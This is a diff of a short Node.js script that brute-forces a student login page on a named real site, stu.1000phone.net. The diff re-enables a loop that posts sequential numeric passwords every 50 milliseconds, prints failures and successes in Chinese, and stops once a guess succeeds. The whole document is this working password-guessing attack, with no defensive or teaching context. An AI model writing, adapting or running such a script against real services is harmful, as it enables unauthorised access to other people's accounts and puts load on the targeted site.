@@ -1,6 +1,6 @@
 var request = require('request');
-
-/*function hack(pass) {
+//requestAnimationFrame
+function hack(pass, successCallback, failCallback) {
 	request.post({
 		//method: "post",
 		url: "http://stu.1000phone.net/student.php/Public/login",
@@ -10,21 +10,27 @@ var request = require('request');
 		}
 	}, (err, res, body) => {
 		if(body) {
-			console.log("失败", pass)
+			successCallback(pass);
+			//console.log("失败", pass)
 		} else {
-			console.log("成功", pass)
-			clearInterval(timer);
+			failCallback(pass);
+			//console.log("成功", pass);
 		}
 		//console.log(body)
 	})
 }
 
-let num = 270000;
+let num = 273900;
 let timer = setInterval(() => {
-	hack(num);
+	hack(num, function(pass) {
+		console.log("失败", pass)
+	}, function(pass) {
+		console.log("成功", pass);
+		clearInterval(timer);
+	});
 	num++;
-})*/
-let num = 273700;
+}, 50);
+/*let num = 273700;
 
 function hack() {
 	num++;
@@ -46,4 +52,4 @@ function hack() {
 		//console.log(body)
 	})
 }
-hack();
+hack();*/
